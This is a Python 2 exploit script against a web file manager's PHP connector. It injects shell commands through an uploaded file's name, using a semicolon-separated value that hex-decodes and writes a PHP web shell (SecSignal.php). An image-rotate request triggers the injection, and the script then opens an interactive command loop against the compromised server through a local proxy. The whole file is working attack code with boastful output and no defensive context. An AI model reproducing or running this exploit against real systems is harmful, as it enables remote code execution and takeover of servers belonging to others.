import requests
import json
import sys

# Define the proxy settings
proxy_host = "127.0.0.1"
proxy_port = 8080

payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'

def usage():
    if len(sys.argv) != 2:
        print "Usage: python exploit.py [URL]"
        sys.exit(0)

def upload(url, payload):
    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}
    data = {"reqid" : "1693222c439f4", "cmd" : "upload", "target" : "l1_Lw", "mtime[]" : "1497726174"}
    
    # Create a session with proxy settings
    session = requests.Session()
    session.proxies = {"http": "http://{}:{}".format(proxy_host, proxy_port), "https": "http://{}:{}".format(proxy_host, proxy_port)}
    
    r = session.post("{}/php/connector.minimal.php".format(url), files=files, data=data)
    j = json.loads(r.text)
    return j['added'][0]['hash']

def imgRotate(url, hash):
    # Create a session with proxy settings
    session = requests.Session()
    session.proxies = {"http": "http://{}:{}".format(proxy_host, proxy_port), "https": "http://{}:{}".format(proxy_host, proxy_port)}
    
    r = session.get("{}/php/connector.minimal.php?target={}&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c".format(url, hash))
    return r.text

def shell(url):
    # Create a session with proxy settings
    session = requests.Session()
    session.proxies = {"http": "http://{}:{}".format(proxy_host, proxy_port), "https": "http://{}:{}".format(proxy_host, proxy_port)}
    
    r = session.get("{}/php/SecSignal.php".format(url))

    if r.status_code == 200:
        print "[+] Pwned! :)"
        print "[+] Getting the shell..."
        while 1:
            try:
                input = raw_input("$ ")

                r = session.get("{}/php/SecSignal.php?c={}".format(url, input))
                print r.text

            except KeyboardInterrupt:
                sys.exit("\nBye kaker!")

    else:
        print "[*] The site seems not to be vulnerable :("

def main():
    usage()
    url = sys.argv[1]

    print "[*] Uploading the malicious image..."
    hash = upload(url, payload)
    print "[*] Running the payload..."
    imgRotate(url, hash)
    shell(url)

if __name__ == "__main__":
    main()
